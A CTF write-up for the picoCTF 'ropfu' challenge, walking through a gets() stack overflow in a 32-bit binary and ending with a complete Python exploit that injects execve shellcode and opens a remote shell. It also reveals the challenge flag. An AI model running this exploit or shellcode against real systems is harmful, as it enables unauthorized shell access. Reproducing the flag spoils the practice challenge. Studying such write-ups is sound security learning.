---
title: PicoCTF - ropfu
published: 2025-10-27
description: PicoCTF Writeup for ropfu Challenge
tags: [binary exploitation, hard, picoCTF 2022, ROP]
category: CTF Writeup
draft: false
lang: en
---

# PicoCTF Writeup - ropfu

PicoCTF Challenge: 
[https://play.picoctf.org/practice/challenge/292?category=6&page=4](https://play.picoctf.org/practice/challenge/292?category=6&page=4)

> ## ropfu
> Author: Sanjay C / LT 'syreal' Jones
> 
> ### Description
> What's ROP?<br>
> Can you exploit the following program to get the flag? Download source.
> ### Hints
> 1st - This is a classic ROP to get a shell<br>
> ### Resources:
> Source Code: [/vuln.c](https://artifacts.picoctf.net/c/44/vuln.c)<br>
> Binary: [/vuln](https://artifacts.picoctf.net/c/44/vuln)<br>

## Decompile

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    int v4; // [esp+0h] [ebp-Ch]

    setvbuf(stdout, 0, 2, 0);
    v4 = getegid();
    setresgid(v4, v4, v4);
    vuln();
    return 0;
}

int vuln()
{
    _BYTE v1[20]; // [esp+0h] [ebp-18h] BYREF

    puts("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!");
    return gets(v1);
}
```

The code above is the decompiled source code from a binary. Let me summarize it more concisely.

```c
int main(int argc, const char **argv, const char **envp)
{
    gid_t effective_group_id;

    setvbuf(stdout, NULL, _IONBF, 0);
    effective_group_id = getegid();
    setresgid(effective_group_id, effective_group_id, effective_group_id);
    vuln();
    return 0;
}

int vuln()
{
    char buffer[20];

    puts("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!");
    return gets(buffer);
}
```

## Analysis

```bash
therustymate-picoctf@webshell:~$ file vuln_3
vuln_3: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=232215a502491a549a155b1a790de97f0c433482, for GNU/Linux 3.2.0, not stripped
```

This program is a simple piece of code that reads input using the vulnerable `gets` function and then returns. As before, I will quickly find the offset that lets us overwrite the return address.

```bash
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/therustymate-picoctf/vuln_3 
warning: Error disabling address space randomization: Operation not permitted
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c

Program received signal SIGSEGV, Segmentation fault.
0x76757473 in ?? ()
(gdb) info registers eip
eip            0x76757473          0x76757473
(gdb) 
```

gdb shows the `EIP` register is currently pointing at `0x76757473`. Converting that back into a string yields the following:

```python
>>> chr(0x76)+chr(0x75)+chr(0x74)+chr(0x73)
'vuts'
```

Since the string "vuts" appears, it indicates that the return address starts from the character **'s'** and spans 4 bytes. The method to calculate the offset is as follows:

```python
>>> len('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c'.split('stuv')[0])
28
```

Therefore, after 28 bytes of characters, we can hijack the return address.

```bash
therustymate-picoctf@webshell:~$ strings ./vuln_3 | grep "flag"
WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1.
(mode_flags & PRINTF_FORTIFY) != 0
version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)
_dl_x86_hwcap_flags
_dl_stack_flags
_dl_x86_cap_flags
```

I searched for functions but couldn't find any additional functions or flag-related information that could be used. This means we must construct a shellcode and develop an RCE exploit that uploads the shellcode directly.

## Exploit Development
```bash
therustymate-picoctf@webshell:~$ checksec --file=./vuln_3
[*] '/home/therustymate-picoctf/vuln_3'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

Using the `checksec` tool to inspect the binary, I confirmed that Stack Canary is active. This means we need to bypass this.

However, unlike our earlier analysis, neither `main` nor `vuln` have a stack canary. The disassembly shows no logic that checks or compares a specific value before returning. Because `abort()` was found, it’s likely used by some other, specific function.

<del>I give up today because my back bones are gone because of this. I will have to see a doctor soon. I will come back tomorrow. (I spent 15 hours)</del>

After studying the binary with IDA and GDB for a long time, I expect the shellcode’s memory address to be stored in the EAX register.

```asm
lea     eax, [ebp+var_18]
push    eax
call    gets
```

Here, to call `gets` the code places the pointer to the 20-byte input buffer (`[ebp+var_18]`) into `EAX` using the `LEA` (Load Effective Address) instruction. In other words, we can expect the shellcode to reside in the buffer pointed to by `EAX`.

I will use the `ROPgadget` tool to locate a `jmp eax` gadget.

```bash
therustymate-picoctf@webshell:~$ ROPgadget --binary ./vuln_3 | grep "jmp eax"
...
0x0805333b : jmp eax
0x08086464 : lea esi, [esi] ; jmp eax
0x08053337 : les eax, ptr [ebx + ebx*2] ; pop esi ; jmp eax
0x0805530d : les ebx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; jmp eax
0x08057f9e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; jmp eax
...
```

There is a `JMP EAX` gadget at `0x0805333b`. I will use this to attempt to jump to the shellcode’s location.

I generated the payload and supplied it as input in GDB.

```python
def craftPayload():
    # ROP Gadgets:
    # 0x0805333b : jmp eax

    rop_chain = struct.pack("<I", 0x0805333b)     # 0x0805333b : jmp eax
    nop_slide = b"\x90" * 100

    # 0xffb00a6c:     0x0805333b      0x2f68686a (jhh starting point)
    shellcode = b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'

    padding = b"A" * 28

    payload = padding + rop_chain + nop_slide + shellcode

    return payload
```

```bash
(gdb) run < last_Shell.bin
Starting program: /home/therustymate-picoctf/vuln_3 < last_Shell.bin
warning: Error disabling address space randomization: Operation not permitted
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!

Program received signal SIGSEGV, Segmentation fault.
0xffe5e6cc in ?? ()
(gdb) info registers
eax            0xffe5e6b0          -1710416
ecx            0x80e531c           135156508
edx            0xffe5e760          -1710240
ebx            0x41414141          1094795585
esp            0xffe5e6d0          0xffe5e6d0
ebp            0x41414141          0x41414141
esi            0x80e5000           135155712
edi            0x80e5000           135155712
eip            0xffe5e6cc          0xffe5e6cc
eflags         0x10202             [ IF RF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
k0             0x0                 0
k1             0x0                 0
k2             0x0                 0
k3             0x0                 0
k4             0x0                 0
k5             0x0                 0
k6             0x0                 0
k7             0x0                 0
(gdb) x/50wx 0xffe5e6cc
0xffe5e6cc:     0x0805333b      0x90909090      0x90909090      0x90909090
0xffe5e6dc:     0x90909090      0x90909090      0x90909090      0x90909090
0xffe5e6ec:     0x90909090      0x90909090      0x90909090      0x90909090
0xffe5e6fc:     0x90909090      0x90909090      0x90909090      0x90909090
0xffe5e70c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffe5e71c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffe5e72c:     0x90909090      0x90909090      0x2f68686a      0x68732f2f
0xffe5e73c:     0x6e69622f      0x0168e389      0x81010101      0x69722434
0xffe5e74c:     0xc9310101      0x59046a51      0x8951e101      0x6ad231e1
0xffe5e75c:     0x80cd580b      0xa454fb00      0x66d6be9f      0x00000000
0xffe5e76c:     0x00000000      0x00000000      0x00000000      0x00000000
0xffe5e77c:     0x00000000      0x080e5000      0x00000001      0x00000000
0xffe5e78c:     0x08049c46      0x08049dc1
(gdb) 
```

When I checked in GDB, it landed correctly near the shellcode's NOP slide. However, for some reason `0x0805333b` appears first.

As I confirmed, the address `0x0805333b` which was supposed to be the first gadget address of the ROP chain was not written directly into `EIP`. Instead, `EIP` was incorrectly overwritten with the stack address that held that gadget address, so that data value was interpreted as opcodes and caused an error.

Therefore, to actually run the ROP chain we need a `JMP ESP` instruction. By using `ESP` (Extended Stack Pointer) we can make the ROP code be treated as the actual top of the stack i.e., the location where the code resides rather than as raw opcodes to execute the ROP chain.

The final result is:

```python
def craftPayload():
    instruction = b"\xFF\xE4"                       # jmp esp
    padding = b"A" * (28 - len(instruction))

    # ROP Gadgets:
    # 0x0805333b : jmp eax
    rop_chain   = struct.pack("<I", 0x0805333b)     # 0x0805333b : jmp eax

    nop_slide = b"\x90" * 100
    shellcode = b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'

    payload = padding + instruction + rop_chain + nop_slide + shellcode

    return payload
```

## Exploit
```python
from argparse import ArgumentParser
from socket import *
import struct
import time

def craftPayload(shellcode_path: str):
    instruction = b"\xFF\xE4"                       # jmp esp
    padding = b"A" * (28 - len(instruction))

    # ROP Gadgets:
    # 0x0805333b : jmp eax
    rop_chain   = struct.pack("<I", 0x0805333b)     # 0x0805333b : jmp eax

    nop_slide = b"\x90" * 20
    shellcode = b""
    if shellcode_path == "builtin":
        shellcode = b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
    else:
        fp = open(shellcode_path, "rb")
        shellcode = fp.read()
        fp.close()

    payload = padding + instruction + rop_chain + nop_slide + shellcode

    return payload

def interactive(s: socket):
    while True:
        command = input("$ ")
        if command.strip() == "exit":
            break
        s.send(command.encode() + b"\n")
        response = s.recv(65535)
        print(response.decode())

def exploit(target: str, port: int, shellcode_path: str):
    print("[~] Generating payload...")
    payload = craftPayload(str(shellcode_path))
    print(f"[+] Payload has been generated.")

    s = socket(AF_INET, SOCK_STREAM)
    print(f"[~] Connecting to {target}:{port}...")
    s.connect((target, port))
    print(f"[+] Connected to {target}:{port}.")
    time.sleep(1)
    s.recv(65535)
    print(f"[~] Sending payload...")
    s.send(payload + b"\n")

    print("[+] Payload sent successfully.")
    if shellcode_path == "builtin":
        print("[~] Spawning interactive shell...")
        interactive(s)
    s.close()
    
if __name__ == "__main__":
    parser = ArgumentParser(
        prog="PicoCTF ropfu Exploit",
        description="Exploit for the PicoCTF ropfu challenge",
    )
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="set target IP or URL address",
        type=str
    )
    parser.add_argument(
        "-p", "--port",
        required=True,
        help="set target port",
        type=int
    )
    parser.add_argument(
        "-s", "--shellcode",
        required=False,
        help="set path to shellcode file",
        type=str,
        default="builtin"
    )
    
    args = parser.parse_args()

    TARGET_HOST : str       = str(args.target)
    TARGET_PORT : int       = int(args.port)
    SHELLCODE_PATH : str    = str(args.shellcode)
    exploit(TARGET_HOST, TARGET_PORT, SHELLCODE_PATH)
```

## The End
I tried to build a ROP chain for the first time without a plan, and ended up spending 3 days analyzing the same problem. On the 2nd day I did look at other people’s writeups but couldn’t understand them, which dragged the work into the 3rd day. In the end I finally understood why a `JMP ESP` is injected as opcodes and then a `JMP EAX` ROP chain is required.

## Result
```bash
therustymate-picoctf@webshell:~$ python3 exploit.py -t saturn.picoctf.net -p 63366 
[~] Generating payload...
[+] Payload has been generated.
[~] Connecting to saturn.picoctf.net:63366...
[+] Connected to saturn.picoctf.net:63366.
[~] Sending payload...
[+] Payload sent successfully.
[~] Spawning interactive shell...
$ ls
flag.txt
vuln

$ cat flag.txt
picoCTF{5n47ch_7h3_5h311_4cbbb771}
$ 
```

Flag: `picoCTF{5n47ch_7h3_5h311_4cbbb771}`